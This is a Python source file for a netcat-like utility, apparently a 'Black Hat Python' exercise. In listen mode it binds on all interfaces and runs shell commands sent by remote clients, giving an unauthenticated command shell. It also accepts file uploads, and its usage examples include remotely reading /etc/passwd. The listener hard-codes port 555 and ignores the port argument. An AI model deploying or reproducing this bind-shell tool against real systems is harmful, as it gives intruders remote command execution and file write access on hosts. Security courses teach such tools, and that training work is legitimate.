import argparse
import socket
import sys
import threading
import subprocess
import shlex
import textwrap

class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)
        
        try:
            while True:
                recv_len = 1
                response = ''
                # receive data in chunks of 4096 bytes
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    # if buffer is not full, break the loop
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit()
    
    def listen(self):
        ip_addr="0.0.0.0"
        port=555
        self.socket.bind((ip_addr, port))
        self.socket.listen(5)

        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(
            target=self.handle, args=(client_socket,)
            )
            client_thread.start()

    def handle(self, client_socket):
        print(self.args)
        if self.args.execute:
            output = execute_command(self.args.execute)
            client_socket.send(output.encode())
        elif self.args.upload:
            file_buffer = b''
            print(f'Uploading to {self.args.upload}')
            while True:
                data=client_socket.recv(4096)
                print(data)
                if data:
                    file_buffer += data
                else:
                    break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute_command(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()

def execute_command(command):
    command = command.strip()
    if not command:
        return
    # create a seperate process to execute the command split command using shell lexical analyzer and sending error output to stdout
    output = subprocess.check_output(shlex.split(command),stderr=subprocess.STDOUT)
    return output.decode()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Netcat-like utility for reverse shell and bind shell functionality.',
                                    formatter_class=argparse.RawDescriptionHelpFormatter,
                                    epilog=textwrap.dedent('''
                                    Example: 2
                                    netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
                                    netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
                                    netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # execute command
                                    echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
                                    netcat.py -t 192.168.1.108 -p 5555 # connect to server
                                    '''))
    parser.add_argument('-c', '--command', action='store_true', help='command shell') 
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()
    # print(args)
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()
    nc = NetCat(args, buffer.encode())
    nc.run()